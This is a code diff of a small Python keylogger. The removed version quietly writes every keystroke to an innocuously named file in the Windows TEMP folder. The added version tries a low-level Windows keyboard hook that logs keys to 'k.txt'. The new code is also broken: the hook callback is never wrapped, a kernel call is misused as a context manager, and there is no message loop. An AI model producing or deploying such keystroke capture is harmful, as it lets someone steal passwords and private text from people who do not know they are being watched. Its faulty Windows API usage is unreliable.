@@ -1,25 +1,16 @@
-import os
-from ctypes import windll, CFUNCTYPE, c_int, POINTER, cast
-from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-
-def get_file_path():
-    return os.path.join(os.getenv('TEMP'), 'temp_data.txt')
+import _thread
+from ctypes import windll
 
 def on_press(key):
-    try:
-        with open(get_file_path(), 'a') as f:
-            f.write(key.char)
-    except AttributeError:
-        with open(get_file_path(), 'a') as f:
-            f.write(str(key))
+    with windll.kernel32.LockResource(0):
+        try:
+            k = key.char
+        except AttributeError:
+            k = str(key)
+        with open("k.txt", "a") as f:
+            f.write(k)
+        print(f"Key pressed: {k}")
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
-
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    try:
-        listener.join()
-    except KeyboardInterrupt:
-        pass
+windll.user32.SetWindowsHookExA(13, on_press, 0, 0)
+while True:
+    windll.kernel32.Sleep(100)
